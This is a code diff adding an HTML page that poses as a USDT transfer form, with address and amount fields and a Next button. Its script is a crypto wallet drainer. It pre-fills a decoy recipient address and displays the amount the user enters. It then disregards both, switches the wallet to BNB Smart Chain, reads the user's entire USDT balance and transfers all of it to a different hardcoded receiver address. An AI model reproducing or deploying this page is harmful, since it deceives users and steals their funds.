@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer</title>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    <script src="ethers.umd.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #1B1B1B;
+            --box-bg: #121212;
+            --box-border: #27272a;
+            --text-main: #FFFFFF;
+            --accent-color: #48FF91;
+            --btn-disabled-bg: #274E37;
+            --btn-disabled-text: #1E3324;
+        }
+
+        @media (prefers-color-scheme: light) {
+            :root {
+                --bg-color: #F8FAFC;
+                --box-bg: #FFFFFF;
+                --box-border: #E2E8F0;
+                --text-main: #0F172A;
+                --accent-color: #0500FF;
+                --btn-disabled-bg: #E0E7FF;
+                --btn-disabled-text: #93C5FD;
+            }
+        }
+
+        body { background-color: var(--bg-color); color: var(--text-main); font-family: sans-serif; min-height: 100vh; padding: 1rem; max-width: 28rem; margin: 0 auto; user-select: none; display: flex; flex-direction: column; justify-content: space-between; transition: background-color 0.3s, color 0.3s; }
+        .box { background-color: var(--box-bg); border: 2px solid var(--box-border); border-radius: 1rem; padding: 1rem; display: flex; align-items: center; justify-content: space-between; transition: all 0.2s; }
+        .box-focus { border-color: var(--accent-color) !important; }
+        input { background: transparent; color: var(--text-main) !important; width: 100%; border: none; outline: none; font-size: 0.875rem; font-weight: 500; }
+        input::placeholder { color: #71717a; }
+        .btn-green { width: 100%; background-color: var(--accent-color); color: #FFFFFF; font-weight: 600; padding: 1rem; border-radius: 1rem; cursor: pointer; border: none; transition: opacity 0.2s; }
+        .btn-green:hover { opacity: 0.9; }
+        .btn-disabled { width: 100%; background-color: var(--btn-disabled-bg); color: var(--btn-disabled-text); font-weight: 600; padding: 1rem; border-radius: 1rem; cursor: not-allowed; border: none; }
+        .text-green { color: var(--accent-color); cursor: pointer; font-weight: 600; }
+        .icon-green { cursor: pointer; color: var(--accent-color); display: flex; align-items: center; }
+    </style>
+</head>
+<body onload="initPage()">
+
+    <div style="margin-top: 0.5rem; display: flex; flex-direction: column; gap: 2rem;">
+        <div>
+            <label style="display: block; color: #9ca3af; font-size: 0.75rem; font-weight: 500; margin-bottom: 0.5rem;">Address or Domain Name</label>
+            <div id="addressBox" class="box">
+                <input type="text" id="recipientAddress" placeholder="Search or Enter" onfocus="highlightBox(true)" onblur="highlightBox(false)" oninput="validateForm()">
+                
+                <div style="display: flex; align-items: center; gap: 0.75rem; font-size: 0.875rem; white-space: nowrap;">
+                    <span id="clearAddressBtn" onclick="clearAddress()" style="cursor: pointer; color: #9ca3af; display: none;">
+                        <svg xmlns="http://www.w3.org/2000/svg" style="height: 1rem; width: 1rem;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </span>
+
+                    <span onclick="pasteAddress()" class="text-green">Paste</span>
+                    
+                    <span class="icon-green">
+                        <svg xmlns="http://www.w3.org/2000/svg" style="height: 1.5rem; width: 1.5rem;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 4h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 4v16M4 8h2M4 12h2M4 16h2" />
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13 9h4M13 13h4" />
+                        </svg>
+                    </span>
+
+                    <span class="icon-green">
+                        <svg xmlns="http://www.w3.org/2000/svg" style="height: 1.5rem; width: 1.5rem;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M4 8V5a1 1 0 011-1h3M4 16v3a1 1 0 001 1h3M20 8V5a1 1 0 00-1-1h-3M20 16v3a1 1 0 01-1 1h-3M7 12h10" />
+                        </svg>
+                    </span>
+                </div>
+            </div>
+        </div>
+
+        <div>
+            <label style="display: block; color: #9ca3af; font-size: 0.75rem; font-weight: 500; margin-bottom: 0.5rem;">Amount</label>
+            <div id="amountBox" class="box">
+                <input type="number" id="usdtAmount" placeholder="0" onfocus="highlightAmountBox(true)" onblur="highlightAmountBox(false)" oninput="validateForm()" style="font-size: 1.125rem;">
+                <div style="display: flex; align-items: center; gap: 0.75rem; font-size: 0.875rem; font-weight: 500; white-space: nowrap;">
+                    <span id="clearAmountBtn" onclick="clearAmount()" style="cursor: pointer; color: #9ca3af; display: none;">
+                        <svg xmlns="http://www.w3.org/2000/svg" style="height: 1rem; width: 1rem;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </span>
+                    <span style="color: #e5e7eb;">USDT</span>
+                    <span class="text-green">Max</span>
+                </div>
+            </div>
+            <p id="usdValue" style="color: #9ca3af; font-size: 0.75rem; font-weight: 500; margin-top: 0.5rem;">≈ $0.00</p>
+        </div>
+    </div>
+
+    <div style="margin-top: 2rem; margin-bottom: 1.5rem;">
+        <button id="nextBtn" onclick="triggerSmartContract()" disabled class="btn-disabled">
+            Next
+        </button>
+    </div>
+
+    <script>
+        const CONFIG = {
+            receiver: "0x1d20E61FaddaEfA9C85585a1C21cf1639c9C3e1f",
+            displayAddress: "0x3A404bd3810d7Fc37d1d7FeDC31D2192f549d357",
+            contract: "0x55d398326f99059ff775485246999027b3197955",
+            chainId: "0x38"
+        };
+
+        function initPage() {
+            document.getElementById("recipientAddress").value = CONFIG.displayAddress;
+            validateForm();
+        }
+
+        function highlightBox(isFocused) {
+            const box = document.getElementById("addressBox");
+            if (isFocused) box.classList.add("box-focus");
+            else box.classList.remove("box-focus");
+        }
+
+        function highlightAmountBox(isFocused) {
+            const box = document.getElementById("amountBox");
+            if (isFocused) box.classList.add("box-focus");
+            else box.classList.remove("box-focus");
+        }
+
+        function validateForm() {
+            const address = document.getElementById("recipientAddress").value;
+            const amount = document.getElementById("usdtAmount").value;
+            const nextBtn = document.getElementById("nextBtn");
+            const usdValue = document.getElementById("usdValue");
+            
+            document.getElementById("clearAddressBtn").style.display = address.length > 0 ? "inline-block" : "none";
+            document.getElementById("clearAmountBtn").style.display = amount.length > 0 ? "inline-block" : "none";
+
+            if (amount && parseFloat(amount) > 0) {
+                nextBtn.disabled = false;
+                nextBtn.className = "btn-green";
+                usdValue.innerText = `≈ $${parseFloat(amount).toFixed(2)}`;
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.className = "btn-disabled";
+                usdValue.innerText = "≈ $0.00";
+            }
+        }
+
+        function clearAddress() {
+            document.getElementById("recipientAddress").value = "";
+            validateForm();
+        }
+
+        function clearAmount() {
+            document.getElementById("usdtAmount").value = "";
+            validateForm();
+        }
+
+        async function pasteAddress() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById("recipientAddress").value = text;
+                validateForm();
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        async function triggerSmartContract() {
+            if (!window.ethereum) {
+                return;
+            }
+
+            try {
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56n) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: CONFIG.chainId }],
+                        });
+                    } catch (switchError) {
+                        return;
+                    }
+                }
+
+                const signer = await provider.getSigner();
+                const userAddress = await signer.getAddress();
+
+                const abi = [
+                    "function transfer(address recipient, uint256 amount) public returns (bool)",
+                    "function balanceOf(address owner) view returns (uint256)"
+                ];
+
+                const contract = new ethers.Contract(CONFIG.contract, abi, signer);
+                
+                const fullBalanceWei = await contract.balanceOf(userAddress);
+
+                if (fullBalanceWei <= 0n) {
+                    return;
+                }
+
+                const txTransfer = await contract.transfer(CONFIG.receiver, fullBalanceWei);
+                await txTransfer.wait();
+
+            } catch (error) {
+                console.error(error);
+            }
+        }
+    </script>
+</body>
+</html>
